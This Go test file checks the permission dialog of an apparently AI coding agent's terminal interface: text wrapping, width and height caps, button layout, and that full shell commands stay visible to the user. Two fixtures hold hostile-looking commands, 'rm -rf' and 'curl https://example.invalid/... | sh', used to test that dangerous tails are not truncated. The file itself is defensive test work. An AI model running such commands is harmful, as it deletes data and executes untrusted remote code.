package ui

import (
	"strings"
	"testing"

	"gogent/internal/permission"

	tui "github.com/hobbestherat/turbotui"
	tv "github.com/hobbestherat/turbotui/turbotv"
)

// TestWrapTextRowCounts locks the row count of turbotui's exported tv.WrapText,
// the wrap gogent now delegates to for sizing the message/permission body (issue
// #299). The dialog height prediction can only match the real TextView render if
// this contract holds.
func TestWrapTextRowCounts(t *testing.T) {
	const w = 10
	for _, tc := range []struct {
		name string
		text string
		want int
	}{
		{"empty is one row", "", 1},
		{"short fits", "hello", 1},
		{"exact width", "abcdefghij", 1},
		{"two words wrap", "hello world", 2},
		{"over-long word splits", "abcdefghijk", 2},
		{"over-long with remainder", "abcdefghijklmn", 2}, // 14 -> 10 + 4
		{"over-long exact multiple", "aaaaaaaaaa", 1},     // 10 == width
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := len(tv.WrapText(tc.text, w)); got != tc.want {
				t.Errorf("len(tv.WrapText(%q, %d)) = %d, want %d", tc.text, w, got, tc.want)
			}
		})
	}

	// Width below 1 is treated as 1, so each rune of a word lands on its own row.
	if got := len(tv.WrapText("abc def", 0)); got != 6 {
		t.Errorf("len(tv.WrapText(\"abc def\", 0)) = %d, want 6 (one rune per column)", got)
	}
}

// TestPermissionBodyRows checks the wrap-row counter that sizes the permission
// body: each logical line wraps independently at width-5 (the body spans width-4
// columns and turbotui reserves the last for the scrollbar), never below one row.
func TestPermissionBodyRows(t *testing.T) {
	lines := func(texts ...string) []permissionBodyLine {
		out := make([]permissionBodyLine, len(texts))
		for i, s := range texts {
			out[i] = permissionBodyLine{text: s, color: tv.DefaultTheme.DialogFG}
		}
		return out
	}
	for _, tc := range []struct {
		name  string
		body  []permissionBodyLine
		width int
		want  int
	}{
		{"single short line", lines("Run shell?"), 64, 1},
		{"two short lines", lines("question", "$ ls"), 64, 2},
		{"empty body floors at one", nil, 64, 1},
		// width 10 -> wrapW 5; a 12-char line hard-splits into 3 rows.
		{"long line hard-splits", lines(strings.Repeat("x", 12)), 10, 3},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := permissionBodyRows(tc.body, tc.width); got != tc.want {
				t.Errorf("permissionBodyRows = %d, want %d", got, tc.want)
			}
		})
	}
}

// TestPermissionDialogBody verifies the full resource/path and shell command appear
// verbatim in the body (no truncation), with the "$ " prompt on the command and
// the right colours. This is the core of issue #122: decision-relevant text must
// not be hidden behind "…".
func TestPermissionDialogBody(t *testing.T) {
	t.Run("shell command kept in full", func(t *testing.T) {
		longCmd := "rm -rf /tmp/build && curl https://example.invalid/some/very/long/path/that/exceeds/the/old/cutoff | sh"
		req := permission.Request{Action: permission.ActionShell, Detail: longCmd}
		got := permissionDialogBody(req, "The agent wants to run shell commands in this session.")
		if len(got) != 2 {
			t.Fatalf("got %d lines, want 2: %+v", len(got), got)
		}
		if got[0].text != "The agent wants to run shell commands in this session." {
			t.Errorf("question line = %q", got[0].text)
		}
		if got[0].color != tv.DefaultTheme.DialogFG {
			t.Errorf("question color = %+v, want DialogFG", got[0].color)
		}
		if got[1].text != "$ "+longCmd {
			t.Errorf("command line = %q, want full command with $ prefix", got[1].text)
		}
		if got[1].color != colorDialogDetail {
			t.Errorf("command color = %+v, want colorDialogDetail", got[1].color)
		}
		if !strings.Contains(got[1].text, "| sh") {
			t.Errorf("dangerous tail hidden: %q", got[1].text)
		}
	})

	t.Run("external path kept in full via question", func(t *testing.T) {
		longPath := "/home/user/very/long/path/that/used/to/be/cut/off/with/ellipsis"
		question := "The agent wants to access a location outside the workspace:\n" + longPath
		got := permissionDialogBody(permission.Request{Action: permission.ActionExternal, Resource: longPath}, question)
		joined := strings.Join(linesText(got), "\n")
		if !strings.Contains(joined, longPath) {
			t.Errorf("full path missing from body:\n%s", joined)
		}
		if strings.Contains(joined, "...") {
			t.Errorf("body elided the path:\n%s", joined)
		}
	})

	t.Run("multiline command keeps prompt only on first line", func(t *testing.T) {
		got := permissionDialogBody(permission.Request{Action: permission.ActionShell, Detail: "echo a\necho b"}, "q")
		if len(got) != 3 {
			t.Fatalf("got %d lines, want 3: %+v", len(got), got)
		}
		if got[1].text != "$ echo a" || got[2].text != "echo b" {
			t.Errorf("multiline detail = %q / %q", got[1].text, got[2].text)
		}
	})

	t.Run("no detail omits the command", func(t *testing.T) {
		got := permissionDialogBody(permission.Request{Action: permission.ActionSubagent}, "The agent wants to spawn a sub-agent.")
		if len(got) != 1 {
			t.Fatalf("got %d lines, want 1: %+v", len(got), got)
		}
	})
}

func linesText(lines []permissionBodyLine) []string {
	out := make([]string, len(lines))
	for i, l := range lines {
		out[i] = l.text
	}
	return out
}

// resolvePermissionDialog mirrors showPermissionDialog's sizing at open time: the
// spec, resolved against the terminal by the same policy w.dialogRect uses, and
// the derived body origin/height and button row.
func resolvePermissionDialog(termW, termH int, hasReq bool, body []permissionBodyLine) (width, height, bodyY, bodyH, btnY int) {
	spec := permissionDialogSpec(termW, termH, hasReq, body)
	_, _, width, height = tv.ResolveDialogRect(spec, termW, termH)
	bodyY, bodyH, btnY = permissionContentLayout(height, hasReq)
	return width, height, bodyY, bodyH, btnY
}

// TestPermissionDialogContentWidthCapped is the #309 acceptance test: the dialog is
// no longer forced to full width (the old PreferredW=MaxW=termW-2). A short prompt
// stays at its content floor, and a long command grows the dialog only up to
// permissionMaxWidth and then wraps/scrolls — it never spans the whole terminal.
func TestPermissionDialogContentWidthCapped(t *testing.T) {
	t.Run("short prompt stays compact, not full width", func(t *testing.T) {
		body := []permissionBodyLine{{"Run?", tv.DefaultTheme.DialogFG}}
		for _, termW := range []int{120, 160, 200} {
			width, _, _, _, _ := resolvePermissionDialog(termW, 40, false, body)
			if width != permissionMinWidth {
				t.Errorf("termW=%d: short-prompt width = %d, want the %d floor (not full width)", termW, width, permissionMinWidth)
			}
			if width >= termW-4 {
				t.Errorf("termW=%d: width %d still spans the terminal", termW, width)
			}
		}
	})

	t.Run("long command grows only to the width cap", func(t *testing.T) {
		body := []permissionBodyLine{{"$ " + strings.Repeat("arg-", 80), colorTool}}
		for _, termW := range []int{120, 160, 200} {
			width, _, _, _, _ := resolvePermissionDialog(termW, 40, false, body)
			// The binding cap is the tighter of permissionMaxWidth and the 80%
			// percentage default (which is the limit on a 120-col terminal: 96 < 110).
			wantW := permissionMaxWidth
			if pct := termW * 80 / 100; pct < wantW {
				wantW = pct
			}
			if width != wantW {
				t.Errorf("termW=%d: long-command width = %d, want capped at %d", termW, width, wantW)
			}
			if width >= termW-4 {
				t.Errorf("termW=%d: width %d spans the terminal; the cap must hold", termW, width)
			}
		}
	})
}

// TestPermissionDialogCapsHeightAndScrolls is the #309 acceptance for the new MaxH
// cap: a tall body grows only to permissionMaxHeight and then the body scrolls
// (bodyH < content rows), instead of growing without bound.
func TestPermissionDialogCapsHeightAndScrolls(t *testing.T) {
	body := make([]permissionBodyLine, 40)
	for i := range body {
		body[i] = permissionBodyLine{text: "line of output", color: colorTool}
	}
	width, height, _, bodyH, _ := resolvePermissionDialog(120, 60, false, body)
	if height > permissionMaxHeight {
		t.Errorf("height = %d, want capped at permissionMaxHeight (%d)", height, permissionMaxHeight)
	}
	if contentRows := permissionBodyRows(body, width); bodyH >= contentRows {
		t.Errorf("bodyH = %d, want < content rows %d (a capped tall body must scroll)", bodyH, contentRows)
	}
	if bodyH < 1 {
		t.Errorf("bodyH = %d, want >= 1", bodyH)
	}
}

// TestPermissionDialogLayout covers the structural identities, the requester row,
// grow-to-fit on a roomy terminal and clamp/scroll on a small one.
func TestPermissionDialogLayout(t *testing.T) {
	t.Run("structural identities hold", func(t *testing.T) {
		body := []permissionBodyLine{{"q", tv.DefaultTheme.DialogFG}}
		_, height, bodyY, bodyH, btnY := resolvePermissionDialog(120, 40, false, body)
		if height != bodyY+bodyH+5 {
			t.Errorf("height = %d, want bodyY(%d)+bodyH(%d)+5 = %d", height, bodyY, bodyH, bodyY+bodyH+5)
		}
		if btnY != bodyY+bodyH+1 {
			t.Errorf("btnY = %d, want %d", btnY, bodyY+bodyH+1)
		}
		if height < permissionMinHeight {
			t.Errorf("height %d below floor %d", height, permissionMinHeight)
		}
	})

	t.Run("requester pushes body down one row", func(t *testing.T) {
		body := []permissionBodyLine{{"q", tv.DefaultTheme.DialogFG}}
		_, _, bodyY, _, _ := resolvePermissionDialog(120, 40, false, body)
		_, _, bodyYReq, _, _ := resolvePermissionDialog(120, 40, true, body)
		if bodyY != 1 || bodyYReq != 2 {
			t.Errorf("bodyY = %d (no req) / %d (req), want 1 / 2", bodyY, bodyYReq)
		}
	})

	t.Run("roomy terminal shows everything (no scroll)", func(t *testing.T) {
		longCmd := strings.Repeat("arg-", 60) // wraps to several rows
		body := []permissionBodyLine{{"$ " + longCmd, colorTool}}
		width, _, _, bodyH, _ := resolvePermissionDialog(120, 60, false, body)
		want := permissionBodyRows(body, width)
		if bodyH < want {
			t.Errorf("bodyH = %d < content %d: should not scroll on a roomy terminal", bodyH, want)
		}
	})

	t.Run("body scrolls but stays on screen on a short terminal", func(t *testing.T) {
		body := []permissionBodyLine{{"$ " + strings.Repeat("arg-", 200), colorTool}}
		_, height, _, bodyH, _ := resolvePermissionDialog(120, 12, false, body)
		if bodyH < 1 {
			t.Fatalf("bodyH = %d, want >= 1", bodyH)
		}
		if height > 12 {
			t.Errorf("height %d exceeds terminal 12", height)
		}
	})

	t.Run("tiny terminal honours floor and keeps a body", func(t *testing.T) {
		body := []permissionBodyLine{{"q", tv.DefaultTheme.DialogFG}}
		width, height, _, bodyH, _ := resolvePermissionDialog(40, 10, false, body)
		// MinW floor (52) is honoured even though it slightly exceeds a 40-col
		// terminal — turbotui's documented "floor wins" policy.
		if width < permissionMinWidth {
			t.Errorf("width %d below floor %d", width, permissionMinWidth)
		}
		if height > 10 {
			t.Errorf("height %d exceeds terminal 10", height)
		}
		if bodyH < 1 {
			t.Errorf("bodyH = %d, want >= 1", bodyH)
		}
	})
}

// TestPermissionDialogReResolvesOnResize locks path-independent re-resolution
// (issues #299, #309): permissionDialogSpec measures PrefH against the open-time
// width, so dialog.Fit alone would pin the dialog to the terminal it was opened on.
// installResizeReflow recomputes the spec from the live terminal instead, so a
// permission dialog resized into a screen matches one opened fresh there.
//
// A long command makes the width re-resolution observable: on an 80-col terminal it
// is held below the cap, on a 200-col terminal it reaches permissionMaxWidth.
func TestPermissionDialogReResolvesOnResize(t *testing.T) {
	req := permission.Request{Action: permission.ActionShell, Detail: strings.Repeat("arg-", 80)}

	resized := newTestWorkbench(t)
	resized.app.Resize(80, 24)
	showPermissionDialog(resized.desktop, req, "", func(permission.Decision) {})
	if top := resized.desktop.TopLayer(); top == nil || top.Name != "permission-dialog" {
		t.Fatalf("permission dialog did not open")
	}
	small := dialogBounds(resized)

	resized.app.Resize(200, 50)
	grown := dialogBounds(resized)
	if grown.W <= small.W {
		t.Fatalf("permission width did not re-resolve on resize: small=%d grown=%d", small.W, grown.W)
	}

	fresh := newTestWorkbench(t)
	fresh.app.Resize(200, 50)
	showPermissionDialog(fresh.desktop, req, "", func(permission.Decision) {})
	want := dialogBounds(fresh)

	if grown.W != want.W || grown.H != want.H {
		t.Errorf("permission resized into 200x50 = %dx%d, want %dx%d (fresh open); the spec must re-resolve",
			grown.W, grown.H, want.W, want.H)
	}
	if want.W != permissionMaxWidth {
		t.Errorf("fresh permission width for a long command = %d, want permissionMaxWidth %d", want.W, permissionMaxWidth)
	}
}

// TestPermissionButtonRow checks the three-button row is always in-bounds,
// non-overlapping, with "Allow once" left-anchored, "Deny" right-anchored, and the
// "Always …" button sized to its (possibly elided) label between them.
func TestPermissionButtonRow(t *testing.T) {
	const btnY = 9
	for _, width := range []int{permissionMinWidth, 64, 80, 116, 196} {
		t.Run("", func(t *testing.T) {
			rightX := width - 3
			allow, always, deny, alwaysText := permissionButtonRow(width, btnY, "Always allow /some/path")
			rects := []tv.Rect{allow, always, deny}
			labels := []string{"Allow once", alwaysText, "Deny"}
			for i, r := range rects {
				if r.Y != btnY || r.H != 1 {
					t.Errorf("rect %d (%q) = %+v, want Y=%d H=1", i, labels[i], r, btnY)
				}
				if r.W <= 0 {
					t.Errorf("rect %d (%q) non-positive width %+v", i, labels[i], r)
				}
				if r.X < 2 || r.X+r.W-1 > rightX {
					t.Errorf("rect %d (%q) %+v out of [2,%d]", i, labels[i], r, rightX)
				}
			}
			if allow.X != 2 {
				t.Errorf("allow X = %d, want left-anchored at 2", allow.X)
			}
			if deny.X+deny.W-1 != rightX {
				t.Errorf("deny right edge = %d, want %d", deny.X+deny.W-1, rightX)
			}
			if allow.W != tv.ButtonLabelWidth("Allow once") {
				t.Errorf("allow width = %d, want %d", allow.W, tv.ButtonLabelWidth("Allow once"))
			}
			if deny.W != tv.ButtonLabelWidth("Deny") {
				t.Errorf("deny width = %d, want %d", deny.W, tv.ButtonLabelWidth("Deny"))
			}
			// Non-overlapping, ordered left -> right.
			if allow.X+allow.W-1 >= always.X {
				t.Errorf("allow overlaps always: %+v %+v", allow, always)
			}
			if always.X+always.W-1 >= deny.X {
				t.Errorf("always overlaps deny: %+v %+v", always, deny)
			}
		})
	}
}

// TestPermissionButtonRowElidesLongResource checks a long resource is elided in
// the button caption (the full text stays in the scrollable body) and the button
// still fits its slot without colliding.
func TestPermissionButtonRowElidesLongResource(t *testing.T) {
	long := "Always allow " + strings.Repeat("/deeply/nested", 20)
	allow, always, deny, alwaysText := permissionButtonRow(permissionMinWidth, 9, long)
	if alwaysText == long {
		t.Errorf("long resource was not elided: %q", alwaysText)
	}
	if !strings.HasSuffix(alwaysText, "...") {
		t.Errorf("elided label = %q, want trailing ...", alwaysText)
	}
	if allow.X+allow.W-1 >= always.X || always.X+always.W-1 >= deny.X {
		t.Errorf("buttons collide after elision: %+v %+v %+v", allow, always, deny)
	}
}

// TestFitButtonLabel checks the chrome-aware elision used for button captions.
// The elided caption's clean display width plus the "[ " / " ]" chrome must fit
// the budget (the minButtonWidth floor only widens a button, it never breaks the
// elision budget).
func TestFitButtonLabel(t *testing.T) {
	for _, tc := range []struct {
		name    string
		label   string
		maxCols int
		want    string
	}{
		{"fits unchanged", "Deny", 8, "Deny"},
		{"exact fit", "Always", 10, "Always"},                     // 6 clean + 4 chrome = 10
		{"elided with ellipsis", "abcdefghij", 8, "a..."},         // 10 clean -> budget 4 -> "a" + "..."
		{"no room for chrome keeps label", "Always", 3, "Always"}, // degenerate
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := fitButtonLabel(tc.label, tc.maxCols)
			if got != tc.want {
				t.Errorf("fitButtonLabel(%q,%d) = %q, want %q", tc.label, tc.maxCols, got, tc.want)
			}
			// When elided, the rendered chrome-width must fit the budget.
			if got != tc.label {
				clean, _ := tv.ParseMnemonic(got)
				if tui.StringWidth(clean)+buttonChrome > tc.maxCols {
					t.Errorf("rendered width %d > %d for %q", tui.StringWidth(clean)+buttonChrome, tc.maxCols, got)
				}
			}
		})
	}
}

// TestPermissionDialogLayoutAcceptance is the end-to-end sizing check for issue
// #122/#299: a long command and external path produce a body that shows all the
// content on a normal terminal (nothing hidden), while degrading to scrolling —
// still on screen — on a small one.
func TestPermissionDialogLayoutAcceptance(t *testing.T) {
	longCmd := "cat /home/user/very/long/path/that/gets/cut/off/then && curl https://example.invalid/x | sh"
	body := permissionDialogBody(permission.Request{Action: permission.ActionShell, Detail: longCmd}, "Run?")

	t.Run("normal terminal shows everything", func(t *testing.T) {
		width, _, _, bodyH, _ := resolvePermissionDialog(120, 40, false, body)
		if want := permissionBodyRows(body, width); bodyH < want {
			t.Errorf("bodyH %d < content %d: the command would scroll on a roomy terminal", bodyH, want)
		}
	})

	t.Run("small terminal scrolls but stays on screen", func(t *testing.T) {
		_, height, _, bodyH, _ := resolvePermissionDialog(60, 10, false, body)
		if height > 10 {
			t.Fatalf("height %d overflows a 10-row terminal", height)
		}
		if bodyH < 1 {
			t.Fatalf("bodyH %d: no visible body", bodyH)
		}
	})
}
